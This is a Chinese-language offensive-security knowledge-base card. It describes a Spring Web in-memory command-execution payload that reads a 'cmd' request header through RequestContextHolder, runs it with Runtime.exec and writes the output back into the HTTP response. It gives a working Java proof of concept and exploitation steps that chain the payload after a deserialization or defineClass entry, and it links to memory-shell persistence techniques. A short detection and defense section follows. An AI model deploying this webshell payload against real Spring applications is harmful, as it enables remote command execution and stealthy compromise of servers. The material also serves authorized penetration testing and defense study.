---
id: web-java-framework-spring-requestcontextholder-cmd-header-echo
title: Spring RequestContextHolder 命令载荷：取当前 request/response，读 cmd 头 Runtime.exec 回显
type: scenario
domain: web
path: web/java/framework/spring
technique: spring-requestcontextholder-cmd-header-echo
tags:
- java
- spring
- requestcontextholder
- memory-shell
- command-execution
- deserialization
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-08'
updated: '2026-11-08'
verification:
  verified_by: verifier-V280
  verified_at: '2026-11-08T02:10:18+08:00'
  notes: 已对照原文 Evil 类实现核对：RequestContextHolder.getRequestAttributes→getRequest/getResponse→getHeader("cmd")→Runtime.exec（Windows cmd.exe /c、Linux /bin/sh -c）→Scanner 读输出→getWriter 回显均符；与既有 SpringEcho 反序列化卡入口/载荷定位不同，属独立执行体原子；未在本机执行
url: /docs/web/java/framework/spring/web-java-framework-spring-requestcontextholder-cmd-header-echo/
draft: false
kb_aliases:
- RequestContextHolder 内存马
- cmd 头回显
- ServletRequestAttributes getResponse
- Spring 进程内命令载荷
---

## 一句话结论

在 Spring Web 应用的反序列化/表达式执行线程中，可通过 `RequestContextHolder.getRequestAttributes()` 取到当前 `ServletRequestAttributes`，再 `getRequest()`/`getResponse()` 拿到本次请求与响应；载荷读取请求头 `cmd`，用 `Runtime.exec` 执行（Linux `/bin/sh -c`、Windows `cmd.exe /c`），把进程输出写入 `response.getWriter()` 回显。该载荷不落文件、不注册路由，适合作为 defineClass/反序列化链加载后的执行体。

## 原理

- **RequestContextHolder 的 ThreadLocal 机制**：Spring Web 在请求进入时由 `RequestContextListener`、`RequestContextFilter` 或 `DispatcherServlet` 把 `ServletRequestAttributes` 绑定到当前线程（`RequestContextHolder.setRequestAttributes`）。因此只要代码在请求线程上执行，`RequestContextHolder.getRequestAttributes()` 就能取到本次请求的上下文，无需要通过方法参数传递 `HttpServletRequest`。
- **取 request/response**：`ServletRequestAttributes.getRequest()` 返回 `HttpServletRequest`，`getResponse()` 返回 `HttpServletResponse`。请求头通过 `request.getHeader("cmd")` 读取；响应通过 `response.getWriter()` 写回，适合回显文本。
- **为什么用请求头**：Header 不受请求体大小/表单编码限制，且网关/业务代码通常不会检查自定义头；在反序列化入口被 HTTP 请求触发时，攻击者可在同一请求里带上 `cmd`，载荷在构造器/静态块执行时立即读取。
- **命令执行与回显**：按 `os.name` 是否包含 `win` 选择 `cmd.exe /c` 或 `/bin/sh -c`；用 `Scanner` 以 `\A` 为分隔符读取进程 `InputStream` 全部输出，写入 response writer 并 `flush`/`close`，从而在 HTTP 响应中直接看到结果。
- **为什么适合作为内存马载荷**：类可以由 `defineClass` 在内存中定义并实例化，构造器执行一次即可完成命令执行；不落盘、不新增路由/Filter，随进程重启消失。若反序列化入口每个请求都会触发，则可在每次请求中复用。
- **边界**：`RequestContextHolder` 未绑定（非请求线程、未注册 Listener/Filter）时取到 null；响应已提交时 `getWriter` 失败；载荷只在实例化时执行一次，本身不具备持续驻留能力，需要入口反复触发或由其他原子注册持久化组件。

## 触发条件

- 目标为 Spring Web 应用（Spring MVC/Servlet），且 `RequestContextHolder` 在利用点之前已被 `RequestContextListener`/`RequestContextFilter`/`DispatcherServlet` 填充。
- 攻击者已能在请求线程中执行 Java 代码：反序列化入口、表达式注入，或由 defineClass 在请求处理期间实例化的恶意类。
- HTTP 响应尚未提交，`getWriter()` 可用；请求中可携带自定义头 `cmd`。
- 若载荷内部反射 Spring/JDK 内部成员，可能需要先绕过 JDK17 强封装（见关联卡）；本载荷使用公开 API 时可不需要。

## 利用步骤

1. 编写载荷类，在构造器或入口方法中调用 `RequestContextHolder.getRequestAttributes()`。
2. 通过 `getRequest()`/`getResponse()` 取得当前请求与响应；读取请求头 `cmd`。
3. 有命令时按操作系统选择 `cmd.exe /c` 或 `/bin/sh -c` 执行，读取进程输出。
4. 通过 `response.getWriter()` 写回输出并 flush/close。
5. 将载荷类字节码交给 defineClass 入口（如 [[web-java-classloader-methodhandles-lookup-defineclass-same-package]]）在请求处理期间实例化；或把同样逻辑嵌入已有执行点。
6. 发送带 `cmd: <命令>` 头的请求触发反序列化/实例化，从响应读取命令输出。
7. 若需要持久化，改为注册 Filter/Interceptor/Controller（见关联卡），本卡只覆盖一次性执行体。

## PoC

```java
Object attrs = RequestContextHolder.getRequestAttributes();   // ServletRequestAttributes
Object request = attrs.getClass().getMethod("getRequest").invoke(attrs);
Object response = attrs.getClass().getMethod("getResponse").invoke(attrs);

String cmd = (String) request.getClass()
        .getMethod("getHeader", String.class).invoke(request, "cmd");
if (cmd != null && !cmd.isEmpty()) {
    String[] cmds = System.getProperty("os.name").toLowerCase().contains("win")
            ? new String[]{"cmd.exe", "/c", cmd}
            : new String[]{"/bin/sh", "-c", cmd};
    java.io.InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
    java.util.Scanner s = new java.util.Scanner(in).useDelimiter("\\A");
    String out = s.hasNext() ? s.next() : "";
    java.io.Writer writer = (java.io.Writer) response.getClass()
            .getMethod("getWriter").invoke(response);
    writer.write(out);
    writer.flush();
    writer.close();
}
```

> 说明：原文在 JDK17 反序列化打内存马场景中把该逻辑放在 Evil 构造器的 `run()` 中，由 `RequestContextHolder` 反射取 request/response；未在本机执行。

## 变体与关联

- 持久化变体：[[web-java-framework-spring-mvc-interceptor-memshell]] 反射注册 `HandlerInterceptor`，每个请求执行 `preHandle`；本卡是实例化时执行一次的命令回显载荷，二者定位不同。
- 两段式投递：[[web-java-framework-shiro-rememberme-spring-interceptor-memshell-classdata]] 用 `RequestContextHolder` 取请求以读取 `classData` 并 defineClass；本卡直接用同一上下文读 `cmd` 执行，sink 不同。
- 加载原子：[[web-java-classloader-methodhandles-lookup-defineclass-same-package]] 负责在内存中定义并实例化本载荷；[[web-java-classloader-jdk17-class-module-field-spoof]] 负责需要反射 JDK 内部成员时的模块绕过。
- 变体：命令来源可换成参数/Cookie/Body；回显可用 `getOutputStream`；Spring WebFlux 没有 Servlet `RequestContextHolder` 语义，需要改用 Reactor Context；异步线程需显式传递请求属性。
- 边界：非请求线程取不到属性；响应已提交写回失败；入口只触发一次则只能执行一次命令。

## 检测与防御

- 检测：监控请求头中出现 `cmd`/`command` 等命令字段且响应包含命令输出的组合；排查反序列化/表达式入口在同一请求内触发 `Runtime.exec`；关注 `RequestContextHolder.getRequestAttributes` 后紧跟 `getHeader`/`getWriter` 的调用链。
- 防御：JEP 290/ObjectInputFilter 限制反序列化类；RASP 拦截 `Runtime.exec`/`ProcessBuilder` 与异常反射；对自定义命令头做统一过滤；及时提交/关闭响应并避免在反序列化线程执行敏感操作。
- 响应：重启 JVM 清除内存载荷；排查是否注册了持久化组件；轮换泄露凭据；保留请求与响应日志作为 IOC。
- 该场景仅用于授权测试/CTF 分析，不要执行未授权命令。
